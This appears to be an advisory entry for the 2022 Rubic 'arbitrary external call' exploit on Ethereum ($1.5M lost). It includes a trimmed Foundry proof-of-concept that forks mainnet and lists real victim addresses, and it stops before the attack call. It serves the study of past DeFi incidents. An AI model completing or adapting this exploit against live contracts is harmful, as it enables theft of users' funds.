# [?] - Rubic - Arbitrary External Call Vulnerability

## Summary
Severity: Unknown
Chain: Ethereum
Component: Rubic
Published: 2022-12-25
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/Rubic_exp.sol
Type: defi-exploit-poc

## Details
Lost: $1.5M
References:
- https://twitter.com/BlockSecTeam/status/1606993118901198849
- https://twitter.com/peckshield/status/1606937055761952770
- https://etherscan.io/tx/0x9a97d85642f956ad7a6b852cf7bed6f9669e2c2815f3279855acf7f1328e7d46

```solidity
contract ContractTest is Test {
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    RubicProxy1 Rubic1 = RubicProxy1(0x3335A88bb18fD3b6824b59Af62b50CE494143333);
    RubicProxy2 Rubic2 = RubicProxy2(0x33388CF69e032C6f60A420b37E44b1F5443d3333);
    address integrators = 0x677d6EC74fA352D4Ef9B1886F6155384aCD70D90;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16_260_580);
    }

    function testExploit() external {
        address[] memory victims = new address[](26);
        victims[0] = 0x6b8D6E89590E41Fa7484691fA372c3552E93e91b;
        victims[1] = 0x036B5805F9175297Ec2adE91678d6ea0a1e2272A;
        victims[2] = 0xED9c18C5311DBB2b757B6913fB3FE6aa22b1A5b0;
        victims[3] = 0xff266f62a0152F39FCf123B7086012cEb292516A;
        victims[4] = 0x90d9b9CC1BFB77d96f9a44731159DdbcA824C63D;
        victims[5] = 0x1dAeB36442d0B0B28e5c018078b672CF9ee9753B;
        victims[6] = 0xF2E3628f7A85f03F0800712DF3c2EBc5BDb33981;
        victims[7] = 0xf3f4470d71b94CD74435e2e0f0dE0DaD11eC7C5a;
        victims[8] = 0x915E88322EDFa596d29BdF163b5197c53cDB1A68;
        victims[9] = 0xD6aD4bcbb33215C4b63DeDa55de599d0d56BCdf5;
        victims[10] = 0x2afeF7d7de9E1a991c385a78Fb6c950AA3487dbA;
        victims[11] = 0x21FeBbFf2da0F3195b61eC0cA1B38Aa1f7105cDb;
        victims[12] = 0xDbDDb2D6F3d387c0dDA16E197cd1E490543354e1;
        victims[13] = 0x58709C660B2d908098FE95758C8a872a3CaA6635;
        victims[14] = 0xD2C919D3bf4557419CbB519b1Bc272b510BC59D9;
        victims[15] = 0xfE243903c13B53A57376D27CA91360C6E6b3FfAC;
        victims[16] = 0xd5BD9464eB1A73Cca1970655708AE4F560Efc6D1;
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-12/Rubic_exp.sol_
